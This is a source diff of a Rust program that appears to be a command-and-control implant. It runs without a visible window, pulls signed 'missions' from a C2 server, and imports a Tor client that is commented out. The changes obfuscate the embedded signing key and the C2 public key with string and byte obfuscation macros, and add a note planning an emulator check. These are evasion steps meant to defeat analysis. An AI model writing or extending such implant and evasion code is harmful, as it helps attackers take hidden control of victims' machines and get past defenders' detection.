@@ -1,5 +1,5 @@
 #![windows_subsystem = "windows"]
-use std::{env, fs, thread, time};
+use std::{env, fs, path::Path, thread, time};
 
 // use arti_client::{TorClient, TorClientConfig};
 // use arti_hyper::ArtiHttpConnector;
@@ -80,12 +80,10 @@ mod platform;
 
 type AgentResult<T> = Result<T, error::AgentError>;
 
-const C2_VERIFYING_KEY: &str = "IX+xwv+SMQr4QZB8ba1n/fx3W3t5KvHQoCtBJ5HJZuk=";
-
 fn failsafe_loop(
     signing_key: &mut crypto::SigningKey,
     c2_verifying_key: &crypto::VerifyingKey,
-    agent_path: &std::path::Path,
+    agent_path: &Path,
 ) -> AgentResult<()> {
     loop {
         if let Some(mission) = client::missions::get_next(signing_key, &c2_verifying_key)? {
@@ -122,18 +120,6 @@ fn failsafe_loop(
     Ok(())
 }
 
-// pub fn signing_key() -> AgentResult<crypto::SigningKey> {
-//     let signing_key_path = dirs::data_local_dir().unwrap().join(Path::new(".hermes"));
-//     let signing_key = if Path::new(&signing_key_path).exists() {
-//         crypto::get_signing_key_from(fs::read(&signing_key_path)?.as_slice().try_into().unwrap())
-//     } else {
-//         let signing_key = crypto::get_signing_key();
-//         fs::write(&signing_key_path, signing_key.as_bytes())?;
-//         signing_key
-//     };
-//     Ok(signing_key)
-// }
-
 fn main() -> AgentResult<()> {
     if env::var("RUST_LOG").is_err() {
         env::set_var("RUST_LOG", "info");
@@ -148,13 +134,17 @@ fn main() -> AgentResult<()> {
     info!("░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░ ");
     let agent_path = env::current_exe()?;
 
-    // let mut signing_key = signing_key()?;
-    // TODO Obfuscate the signing key
-    let mut signing_key =
-        crypto::get_signing_key_from(include_bytes!(concat!(env!("OUT_DIR"), "/id.key")));
+    // TODO is_emu
+
+    let mut signing_key = crypto::get_signing_key_from(obfstr::obfbytes!(include_bytes!(concat!(
+        env!("OUT_DIR"),
+        "/id.key"
+    ))));
     let c2_verifying_key = crypto::VerifyingKey::from_bytes(
         BASE64_STANDARD
-            .decode(C2_VERIFYING_KEY)?
+            .decode(obfstr::obfstr!(
+                "IX+xwv+SMQr4QZB8ba1n/fx3W3t5KvHQoCtBJ5HJZuk="
+            ))?
             .as_slice()
             .try_into()
             .unwrap(),
